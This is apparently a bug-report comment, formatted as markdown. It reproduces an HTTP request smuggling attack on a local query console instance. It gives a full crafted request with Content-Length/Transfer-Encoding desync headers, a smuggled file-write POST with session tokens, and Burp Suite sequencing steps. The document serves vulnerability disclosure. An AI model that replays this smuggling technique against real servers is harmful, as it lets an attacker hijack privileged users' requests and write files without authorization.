Here's your comment organized in clean markdown:

---

# HTTP Request Smuggling – Reproduction Steps

## Prerequisites

- **Attacker account** – roles: `qconsole-internal` and `qconsole-user`
- **Victim account** – role: `admin`

---

## Step 1 – Capture Required Requests

- Capture a normal GET request from the **attacker**
- Capture the request you want to smuggle (in this case: the file-write POST request)
- Capture a normal request from the **victim**

---

## Step 2 – Craft the Attacker's Outer Request

Strip unnecessary headers from the attacker's normal request, keeping only:

- `Host`
- `Authorization`
- `Connection`
- `Cookie`

Then add the following headers:

```
Content-Length: 5        ← disable "update content length" in Burp
Transfer-Encoding: chunked
```

---

## Step 3 – Build the Smuggled Request Body

1. Paste the smuggled POST request directly after the outer request headers, with **one empty line** separating them.
2. Set the smuggled request's `Content-Length` to `740`:
    
    ```
    Content-Length: 740
    ```
    
3. Count the byte length of the smuggled request body and supply it as the chunk size at the top of the body (hex). Example:
    
    ```
    4bf
    ```
    
4. End the body with `0` on its own line, followed by one empty line — **no blank lines before the `0`**:
    
    ```
    data=hi0
    ```
    

---

## Step 4 – Final Crafted Request

```
GET /qconsole/ HTTP/1.1
Host: localhost:8000
Authorization: Digest username="user", realm="public", nonce="3f2aeebf63627c:9MuQOhZ3eV0L8ominz6GYg==", uri="/qconsole/", response="094a943435ac1e59a86ea99cadf0a207", opaque="c9d74350dff6fef3", qop=auth, nc=0000001b, cnonce="e54a2b747449205b"
Connection: keep-alive
Cookie: csrf-token-8000-=; csrf-token-8000-user=20181774a53a110000eaaba4d7d76bbd5ea8b3868613e83e4c57fb6691fc1a09; server-port=8000; username=user; SessionID=5120fda585b41b11
Content-Length: 5
Transfer-Encoding: chunked

4bf
POST /qconsole/endpoints/explore-file.xqy?dbid=13226672353590835561&uri=hi&view-action=save&cache=1778012963216 HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
X-CSRF-Token: dc4843e0cbe1ffcb4daa8cc0dac7b5803ca4bfa0ab5839daa0af457ebfd050b4
Content-Length: 740
Origin: http://localhost:8000
Authorization: Digest username="user", realm="public", nonce="3f2aeef7e2730e:12pc0mEM7nSFZmcQfJPoTg==", uri="/qconsole/endpoints/explore-file.xqy?dbid=13226672353590835561&uri=hi&view-action=save&cache=1778012963216", response="874e51af893dd86d96f11b9c37228171", opaque="c610b9d518994c27", qop=auth, nc=00000023, cnonce="0def6c3f0137a2c4"
Connection: keep-alive
Referer: http://localhost:8000/qconsole/
Cookie: csrf-token-8000-=; csrf-token-8000-user=dc4843e0cbe1ffcb4daa8cc0dac7b5803ca4bfa0ab5839daa0af457ebfd050b4; server-port=8000; username=user; SessionID=5120fda585b41b11
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: blue

data=hi
0

```

---

## Step 5 – Send via Burp Suite

1. Create a **tab group** containing:
    - The crafted attacker request (above)
    - The victim's captured request
2. **Ensure the attacker request runs first**
3. In Send options, select: **`Send group in sequence (single connection)`**

---

## Notes

- A video walkthrough is attached explaining each step.
- Burp may show an error indicating one tab is empty — this is a **Burp UI quirk unrelated to the attack**. The attack has been tested successfully multiple times despite this error.